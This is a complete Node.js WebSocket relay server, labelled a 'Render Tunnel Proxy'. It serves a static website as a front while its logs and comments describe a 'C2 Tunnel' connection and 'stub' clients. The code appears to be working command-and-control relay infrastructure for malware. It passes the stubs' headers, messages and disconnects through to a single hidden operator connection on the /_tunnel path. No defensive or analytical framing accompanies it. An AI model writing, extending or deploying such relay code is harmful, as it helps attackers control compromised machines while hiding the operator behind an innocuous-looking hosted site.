const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ noServer: true });

const port = process.env.PORT || 10000;

let tunnelWs = null;
const activeConnections = new Map();

function generateId() {
  return crypto.randomBytes(8).toString('hex');
}

app.get('/ping', (req, res) => {
  res.send('ok');
});

// Serve the static files of the main website (index.html, etc)
const path = require('path');
app.use(express.static(path.join(__dirname, '..')));

// Any other HTTP requests
app.use((req, res) => {
  res.status(404).send('Not Found');
});

wss.on('connection', (ws, req) => {
  if (req.url.startsWith('/_tunnel')) {
    if (tunnelWs) {
      console.log('Replacing existing tunnel connection.');
      tunnelWs.close();
    }
    tunnelWs = ws;
    console.log('C2 Tunnel connected successfully.');

    ws.on('message', (message) => {
      try {
        const payload = JSON.parse(message.toString());
        if (payload.type === 'ws_message') {
            const clientWs = activeConnections.get(payload.req_id);
            if (clientWs && clientWs.readyState === WebSocket.OPEN) {
                clientWs.send(payload.data);
            }
        } else if (payload.type === 'ws_close') {
            const clientWs = activeConnections.get(payload.req_id);
            if (clientWs) {
                clientWs.close();
                activeConnections.delete(payload.req_id);
            }
        }
      } catch (err) {
        console.error('Tunnel message error:', err);
      }
    });

    ws.on('close', () => {
      console.log('C2 Tunnel disconnected.');
      tunnelWs = null;
      for (const [id, clientWs] of activeConnections.entries()) {
        clientWs.close();
      }
      activeConnections.clear();
    });
    return;
  }

  // Handle Stub WebSocket connections
  if (!tunnelWs || tunnelWs.readyState !== WebSocket.OPEN) {
    ws.close(1011, 'Tunnel not connected');
    return;
  }

  const reqId = generateId();
  activeConnections.set(reqId, ws);

  tunnelWs.send(JSON.stringify({
    type: 'ws_connect',
    req_id: reqId,
    url: req.url,
    headers: req.headers
  }));

  ws.on('message', (message) => {
    if (tunnelWs && tunnelWs.readyState === WebSocket.OPEN) {
      tunnelWs.send(JSON.stringify({
        type: 'ws_message',
        req_id: reqId,
        data: message.toString() // stubs send JSON string frames
      }));
    }
  });

  ws.on('close', () => {
    activeConnections.delete(reqId);
    if (tunnelWs && tunnelWs.readyState === WebSocket.OPEN) {
      tunnelWs.send(JSON.stringify({
        type: 'ws_close',
        req_id: reqId
      }));
    }
  });
});

server.on('upgrade', (request, socket, head) => {
  wss.handleUpgrade(request, socket, head, (ws) => {
    wss.emit('connection', ws, request);
  });
});

server.listen(port, () => {
  console.log(`Render Tunnel Proxy listening on port ${port}`);
});
